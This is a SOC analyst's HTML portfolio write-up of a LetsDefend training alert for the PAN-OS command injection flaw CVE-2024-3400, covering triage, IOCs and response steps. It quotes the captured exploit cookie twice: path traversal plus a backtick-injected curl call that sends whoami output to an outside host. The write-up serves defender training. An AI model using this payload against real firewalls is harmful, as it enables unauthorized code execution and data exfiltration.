@@ -1,0 +1,369 @@
+<!-- CVE-2024-3400 Palo Alto PAN-OS Command Injection Analysis -->
+<div class="detail-header">
+  <a href="#" class="back-button">← Back to Portfolio</a>
+  <h1>CVE-2024-3400: Palo Alto PAN-OS Command Injection Exploitation Analysis</h1>
+  <p><span class="tag">CVE-2024-3400</span> <span class="tag">Command Injection</span> <span class="tag">Path Traversal</span> <span class="tag">PAN-OS</span> <span class="tag">LetsDefend</span> <span class="tag">Incident Response</span></p>
+</div>
+
+<div class="detail-content">
+  <!-- Disclaimer -->
+  <div class="note" style="background: rgba(239, 68, 68, 0.1); border-left-color: #ef4444;">
+    <h3>⚠️ ETHICAL LAB TESTING DISCLAIMER</h3>
+    <p><strong>This analysis was conducted on the LetsDefend.io SOC simulation platform.</strong> All activities were performed in a controlled, authorized training environment. The goal was educational - to learn how to detect, analyze, and respond to CVE-2024-3400 exploitation attempts as a SOC analyst.</p>
+  </div>
+
+  <!-- Step 1: Dashboard & Alert Triage -->
+  <div class="step">
+    <h3>📋 Step 1: Dashboard & Alert Triage</h3>
+    <p>I logged into the LetsDefend.io practice dashboard and filtered for <strong>Critical severity</strong> alerts. I found a critical alert and took ownership of it to begin my investigation.</p>
+    
+    <div class="lab-image">
+      <img src="assets/images/letsdefend-dashboard-critical.jpg" alt="LetsDefend Dashboard Critical Alert">
+      <div class="lab-image-caption">📸 LetsDefend dashboard - Critical severity alerts showing SOC274</div>
+    </div>
+    
+    <div class="command-box">
+      <span style="color: #66d9ef;">Alert Details:</span><br>
+      <br>
+      SEVERITY: Critical<br>
+      RULE NAME: SOC274 - Palo Alto Networks PAN-OS Command Injection Vulnerability Exploitation (CVE-2024-3400)<br>
+      EVENT ID: 249<br>
+      TIME: Apr 18, 2024, 03:09 AM<br>
+      LEVEL: Security Analyst<br>
+      HOSTNAME: PA-Firewall-01<br>
+      DESTINATION IP: 172.16.17.139<br>
+      SOURCE IP: 144.172.79.92
+    </div>
+  </div>
+
+  <!-- Step 2: Alert Details & Suspicious Cookie -->
+  <div class="step">
+    <h3>🔍 Step 2: Alert Details Review - Finding the Malicious Cookie</h3>
+    <p>I viewed the full alert details and immediately noticed something suspicious in the cookie field.</p>
+    
+    <div class="lab-image">
+      <img src="assets/images/alert-details-cookie.jpg" alt="Alert Details Showing Malicious Cookie">
+      <div class="lab-image-caption">📸 Alert details - SESSID cookie with path traversal and command injection</div>
+    </div>
+    
+    <div class="command-box">
+      <span style="color: #66d9ef;">Malicious Cookie Found:</span><br>
+      <br>
+      <span style="color: #fd971f; word-break: break-all;">SESSID=./../../../opt/panlogs/tmp/device_telemetry/hour/aaa`curl${IFS}144.172.79.92:4444?user=$(whoami)`</span><br>
+      <br>
+      <span style="color: #a6e22e;">What I observed:</span><br>
+      • <span style="color: #f92672;">Path traversal:</span> ./../../../ (trying to navigate up directories)<br>
+      • <span style="color: #f92672;">Command injection:</span> Backticks ` ` and $(whoami)<br>
+      • <span style="color: #f92672;">Outbound connection:</span> curl to 144.172.79.92:4444<br>
+      • <span style="color: #f92672;">Information disclosure:</span> Trying to get the current username via whoami<br>
+      • <span style="color: #f92672;">IFS bypass:</span> ${IFS} instead of spaces to avoid detection<br>
+      • <span style="color: #f92672;">Requested endpoint:</span> /global-protect/login.esp
+    </div>
+    
+    <p><strong>Key observation:</strong> Port 4444 is the default port used by the Metasploit framework. While this doesn't guarantee Metasploit was used, it's a strong indicator of malicious C2 activity.</p>
+  </div>
+
+  <!-- Step 3: Source IP Threat Intelligence -->
+  <div class="step">
+    <h3>🌐 Step 3: Source IP Investigation - VirusTotal</h3>
+    <p>I took the source IP address (144.172.79.92) and ran it through VirusTotal to check if it had been reported as malicious.</p>
+    
+    <div class="lab-image">
+      <img src="assets/images/virustotal-ip-144.JPG" alt="VirusTotal IP Results">
+      <div class="lab-image-caption">📸 VirusTotal - 12 vendors flagged 144.172.79.92 as malicious</div>
+    </div>
+    
+    <div class="command-box">
+      <span style="color: #66d9ef;">VirusTotal Results:</span><br>
+      <br>
+      IP: 144.172.79.92<br>
+      Detection: <span style="color: #ef4444;">12/94 security vendors flagged this IP as malicious</span><br>
+      ASN: 14956 (RouterHosting LLC)<br>
+      <br>
+      <span style="color: #a6e22e;">Vendors that flagged it:</span><br>
+      • ADMINUSLabs → Malicious<br>
+      • AlphaSOC → Malware<br>
+      • CRDF → Malicious<br>
+      • alphaMountain.ai → Malicious<br>
+      • BitDefender → Malware<br>
+      • CyRadar → Malicious
+    </div>
+    
+    <p><strong>Conclusion:</strong> This IP has a bad reputation and is known for malicious activity.</p>
+  </div>
+
+  <!-- Step 4: Check for Planned Test -->
+  <div class="step">
+    <h3>✅ Step 4: False Positive Check - Planned Test Verification</h3>
+    <p>I checked the mailbox/search to see if there were any emails indicating this was a planned penetration test or attack simulation. This is important to avoid reporting false positives.</p>
+    
+    <div class="lab-image">
+      <img src="assets/images/no-planned-test-email..JPG" alt="No Email Found for Planned Test">
+      <div class="lab-image-caption">📸 Email search - No results for planned test notifications</div>
+    </div>
+    
+    <div class="command-box">
+      <span style="color: #66d9ef;">Planned Test Verification:</span><br>
+      <br>
+      ✓ Searched for hostname (PA-Firewall-01) → No results<br>
+      ✓ Searched for source IP (144.172.79.92) → No results<br>
+      ✓ Searched for username → No results<br>
+      ✓ Checked for attack simulation products (Verodin, AttackIQ, Picus) → Not found<br>
+      <br>
+      <span style="color: #a6e22e;">Result:</span> <span style="color: #ef4444;">NOT a planned test - This is a real attack</span>
+    </div>
+  </div>
+
+  <!-- Step 5: Review Raw Logs -->
+  <div class="step">
+    <h3>📄 Step 5: Raw Log Review</h3>
+    <p>I reviewed the raw logs to ensure I didn't miss any additional indicators or context.</p>
+    
+    <div class="lab-image">
+      <img src="assets/images/raw-logs2.JPG" alt="Raw Log Review">
+      <div class="lab-image-caption">📸 Raw log inspection - Confirmed the malicious POST request</div>
+    </div>
+    
+    <div class="command-box">
+      <span style="color: #66d9ef;">Log Confirmation:</span><br>
+      <br>
+      Event Time: Apr 18, 2024, 03:09:55<br>
+      HTTP Method: POST<br>
+      URL: /global-protect/login.esp<br>
+      Source: 144.172.79.92 → Destination: 172.16.17.139<br>
+      Cookie: SESSID=./../../../opt/panlogs/tmp/device_telemetry/hour/aaa`curl${IFS}144.172.79.92:4444?user=$(whoami)`<br>
+      User-Agent: curl (indicates automated/scripted activity)
+    </div>
+  </div>
+
+  
+
+  <!-- Step 6: Running Processes Discovery -->
+  <div class="step">
+    <h3>🐍 Step 6: Running Processes - The Discovery</h3>
+    <p>I reviewed the running processes on the affected endpoint and found something suspicious.</p>
+    
+    <div class="lab-image">
+      <img src="assets/images/raw-logs.jpg" alt="Running Processes Showing Python3">
+      <div class="lab-image-caption">📸 Running processes - Found python3 process with PID 1233</div>
+    </div>
+    
+    <div class="command-box">
+      <span style="color: #66d9ef;">Suspicious Process Found:</span><br>
+      <br>
+      <span style="color: #f92672;">Event Time:</span> Apr 18 2024 15:09:55<br>
+      <span style="color: #f92672;">Process ID:</span> 1233<br>
+      <span style="color: #f92672;">Target Process Command Line:</span> /usr/libexec/mgmtsrvr/start<br>
+      <span style="color: #f92672;">Image Path:</span> /usr/bin/python3<br>
+      <span style="color: #f92672;">Image Hash:</span> 3de2a4392b8715bad0706b2ae12243f166ead37830f7c6d24e7789...<br>
+      <span style="color: #f92672;">Process User:</span> letsdefend<br>
+      <span style="color: #f92672;">Parent Name:</span> systemd<br>
+      <span style="color: #f92672;">Parent Path:</span> /lib/systemd/systemd<br>
+      <span style="color: #f92672; font-weight: bold;">Command Line:</span> <span style="color: #ef4444;">/usr/bin/python3 update.py</span>
+    </div>
+    
+    <p><strong>Red flags:</strong></p>
+    <ul>
+      <li>A python3 process running a script named <strong>update.py</strong> (looks like masquerading)</li>
+      <li>Spawned from systemd (could be persistence mechanism)</li>
+      <li>Running as user "letsdefend"</li>
+      <li>No legitimate reason for a python3 script named update.py on a firewall</li>
+    </ul>
+  </div>
+
+  <!-- Step 7: Hash Analysis -->
+  <div class="step">
+    <h3>🔬 Step 7: Image Hash Analysis - VirusTotal</h3>
+    <p>I took the image hash from the python3 process and submitted it to VirusTotal for malware analysis.</p>
+    
+    <div class="lab-image">
+      <img src="assets/images/hash-virustotal.jpg" alt="Hash VirusTotal Results">
+      <div class="lab-image-caption">📸 VirusTotal - 37/63 vendors flagged the hash as malicious</div>
+    </div>
+    
+    <div class="command-box">
+      <span style="color: #66d9ef;">VirusTotal Hash Results:</span><br>
+      <br>
+      <span style="color: #f92672;">Detection Rate:</span> <span style="color: #ef4444;">37/63 security vendors flagged this file as malicious</span><br>
+      <span style="color: #f92672;">Hash:</span> 3de2a4392b8715bad0706b2ae12243f166ead37830f7c6d24e778985927f9caac<br>
+      <span style="color: #f92672;">File Type:</span> Python script (exploit)<br>
+      <span style="color: #f92672;">Threat Labels:</span> trojan.python/drop<br>
+      <span style="color: #f92672;">Family:</span> python, drop, pyagent<br>
+      <span style="color: #f92672;">Tags:</span> python, exploit, idle, <span style="color: #ef4444; font-weight: bold;">cve-2024-3400</span><br>
+      <br>
+      <span style="color: #a6e22e;">Notable Vendor Detections:</span><br>
+      • AhnLab-V3 → Exploit/Python.CVE-2024-3400<br>
+      • ALYac → Exploit.Python.Agent
+    </div>
+    
+    <p><strong>Confirmed:</strong> This is a malicious Python exploit targeting CVE-2024-3400.</p>
+  </div>
+
+  <!-- Step 8: Vulnerability Research -->
+  <div class="step">
+    <h3>📖 Step 8: Vulnerability Research - CVE-2024-3400</h3>
+    <p>I searched Google for CVE-2024-3400 to understand what this vulnerability is and found the NIST description.</p>
+    
+    <div class="lab-image">
+      <img src="assets/images/cve-2024-3400-nist.jpg" alt="CVE-2024-3400 NIST Description">
+      <div class="lab-image-caption">📸 NIST CVE-2024-3400 - Command injection in Palo Alto PAN-OS GlobalProtect</div>
+    </div>
+    
+    <div class="command-box">
+      <span style="color: #66d9ef;">CVE-2024-3400 Description (NIST):</span><br>
+      <br>
+      "A command injection as a result of arbitrary file creation vulnerability in the GlobalProtect feature of Palo Alto Networks PAN-OS software for specific PAN-OS versions and distinct feature configurations may enable an unauthenticated attacker to execute arbitrary code with root privileges on the firewall."<br>
+      <br>
+      <span style="color: #f92672;">Impact:</span> Unauthenticated RCE with root privileges<br>
+      <span style="color: #f92672;">Affected:</span> Specific PAN-OS versions with GlobalProtect enabled<br>
+      <span style="color: #f92672;">Not affected:</span> Cloud NGFW, Panorama, Prisma Access
+    </div>
+    
+    <p>This perfectly matches what I saw in the alert - an unauthenticated attacker sending a crafted request to the GlobalProtect endpoint.</p>
+  </div>
+
+  <!-- Step 9: Response Actions -->
+  <div class="step">
+    <h3>🛡️ Step 9: Response Actions Taken</h3>
+    <p>Based on my investigation, I took the following actions:</p>
+    
+    <div class="lab-image">
+      <img src="assets/images/isolate-endpoint.jpg" alt="Isolate Endpoint">
+      <div class="lab-image-caption">📸 Isolated PA-Firewall-01 to prevent further compromise</div>
+    </div>
+    
+    <div class="command-box">
+      <span style="color: #66d9ef;">Actions Performed:</span><br>
+      <br>
+      1. ✓ <span style="color: #a6e22e;">Isolated the affected endpoint</span> (PA-Firewall-01) to prevent lateral movement<br>
+      2. ✓ <span style="color: #a6e22e;">Escalated to Tier 2</span> for further investigation and remediation<br>
+      3. ✓ <span style="color: #a6e22e;">Documented all findings</span> in the incident report<br>
+      <br>
+      <span style="color: #fd971f;">Recommended for Tier 2:</span><br>
+      • Kill PID 1233 (python3 update.py)<br>
+      • Block source IP 144.172.79.92 at perimeter<br>
+      • Patch PAN-OS against CVE-2024-3400<br>
+      • Preserve update.py for forensic analysis
+    </div>
+  </div>
+
+  <!-- Investigation Summary -->
+  <div class="step">
+    <h3>📊 Investigation Summary</h3>
+    
+    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin: 1.5rem 0;">
+      <div style="background: rgba(239, 68, 68, 0.1); padding: 1rem; border-radius: 8px; text-align: center;">
+        <div style="font-size: 2rem;">🚨</div>
+        <div><strong>Alert Source</strong></div>
+        <div style="font-size: 0.9rem;">LetsDefend Critical Alert</div>
+      </div>
+      
+      <div style="background: rgba(59, 130, 246, 0.1); padding: 1rem; border-radius: 8px; text-align: center;">
+        <div style="font-size: 2rem;">🔍</div>
+        <div><strong>Malicious Cookie</strong></div>
+        <div style="font-size: 0.9rem;">Path traversal + Command injection</div>
+      </div>
+      
+      <div style="background: rgba(245, 158, 11, 0.1); padding: 1rem; border-radius: 8px; text-align: center;">
+        <div style="font-size: 2rem;">🌐</div>
+        <div><strong>Source IP</strong></div>
+        <div style="font-size: 0.9rem;">12/94 VT vendors flagged</div>
+      </div>
+      
+      <div style="background: rgba(139, 92, 246, 0.1); padding: 1rem; border-radius: 8px; text-align: center;">
+        <div style="font-size: 2rem;">🐍</div>
+        <div><strong>Malicious Process</strong></div>
+        <div style="font-size: 0.9rem;">python3 update.py (PID 1233)</div>
+      </div>
+      
+      <div style="background: rgba(16, 185, 129, 0.1); padding: 1rem; border-radius: 8px; text-align: center;">
+        <div style="font-size: 2rem;">🔬</div>
+        <div><strong>Hash Detection</strong></div>
+        <div style="font-size: 0.9rem;">37/63 VT vendors</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Final Verdict -->
+  <div class="step">
+    <h3>✅ Final Verdict</h3>
+    
+    <div class="command-box" style="background: rgba(239, 68, 68, 0.2); border: 2px solid #ef4444;">
+      <span style="color: #ef4444; font-size: 1.2rem; font-weight: bold;">🚨 TRUE POSITIVE - CONFIRMED EXPLOITATION</span><br>
+      <br>
+      <span style="color: #a6e22e;">Evidence:</span><br>
+      ✓ Malicious cookie with path traversal and command injection<br>
+      ✓ Source IP (144.172.79.92) flagged by 12 threat intel vendors<br>
+      ✓ Port 4444 (Metasploit default) used for C2<br>
+      ✓ Not a planned test - no email notifications<br>
+      ✓ Malicious python3 process (PID 1233) running update.py<br>
+      ✓ Image hash flagged by 37/63 antivirus engines as CVE-2024-3400 exploit<br>
+      ✓ Matches NIST CVE-2024-3400 description exactly
+    </div>
+  </div>
+
+  <!-- Indicators of Compromise -->
+  <div class="step">
+    <h3>📌 Indicators of Compromise (IOCs)</h3>
+    
+    <div class="command-box">
+      <span style="color: #66d9ef;">Network IOCs:</span><br>
+      <br>
+      • <span style="color: #f92672;">Source IP:</span> 144.172.79.92<br>
+      • <span style="color: #f92672;">Destination Port:</span> 4444<br>
+      • <span style="color: #f92672;">URL Pattern:</span> /global-protect/login.esp<br>
+      • <span style="color: #f92672;">Cookie Pattern:</span> SESSID containing ../ and backticks<br>
+      • <span style="color: #f92672;">User-Agent:</span> curl<br>
+      <br>
+      <span style="color: #66d9ef;">Host IOCs:</span><br>
+      <br>
+      • <span style="color: #f92672;">Process:</span> python3 (PID 1233)<br>
+      • <span style="color: #f92672;">Command Line:</span> /usr/bin/python3 update.py<br>
+      • <span style="color: #f92672;">Parent Process:</span> systemd<br>
+      • <span style="color: #f92672;">Image Hash:</span> 3de2a4392b8715bad0706b2ae12243f166ead37830f7c6d24e778985927f9caac<br>
+      • <span style="color: #f92672;">File Name:</span> update.py
+    </div>
+  </div>
+
+  <!-- Recommendations -->
+  <div class="step">
+    <h3>🛡️ Recommendations</h3>
+    
+    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 1rem;">
+      <div style="background: rgba(239, 68, 68, 0.1); padding: 1rem; border-radius: 6px; border-left: 4px solid #ef4444;">
+        <h4>Immediate (Tier 2)</h4>
+        <ul>
+          <li>Isolate PA-Firewall-01 from network</li>
+          <li>Kill PID 1233 (python3 update.py)</li>
+          <li>Block 144.172.79.92 at firewall</li>
+        </ul>
+      </div>
+      
+      <div style="background: rgba(245, 158, 11, 0.1); padding: 1rem; border-radius: 6px; border-left: 4px solid #f59e0b;">
+        <h4>Remediation</h4>
+        <ul>
+          <li>Patch PAN-OS against CVE-2024-3400</li>
+          <li>Preserve update.py for analysis</li>
+          <li>Check for persistence mechanisms</li>
+        </ul>
+      </div>
+
+  <!-- Conclusion -->
+  <div class="step">
+    <h3>📝 Conclusion</h3>
+    <p>This was a <strong>successful true positive exploitation</strong> of CVE-2024-3400. The attacker used a combination of path traversal and command injection in the SESSID cookie to execute arbitrary commands on PA-Firewall-01. They successfully spawned a malicious python3 process running update.py, which was confirmed malicious by 37 antivirus engines on VirusTotal.</p>
+    
+    <div class="note" style="background: rgba(239, 68, 68, 0.1); border-left-color: #ef4444; margin-top: 1rem;">
+      <p><strong>⚠️ Key Takeaway:</strong> Always check running processes, even when terminal and browser history are empty. The attacker tried to hide their activity by clearing history, but process monitoring revealed the compromise. I isolated the endpoint and escalated to Tier 2 for further remediation.</p>
+    </div>
+    
+    <p style="margin-top: 1rem;"><strong>Analyst:</strong> Samuel Ifeoluwa Oshunsan<br>
+    <strong>Platform:</strong> LetsDefend.io SOC Simulation<br>
+    <strong>Date:</strong> April 18, 2024<br>
+    <strong>Action:</strong> Isolated endpoint → Escalated to Tier 2</p>
+    
+    <p style="margin-top: 1rem; font-size: 0.9rem; color: #9ca3af;">
+      <em>This analysis was conducted for educational purposes in the LetsDefend SOC training environment.</em>
+    </p>
+  </div>
+</div>
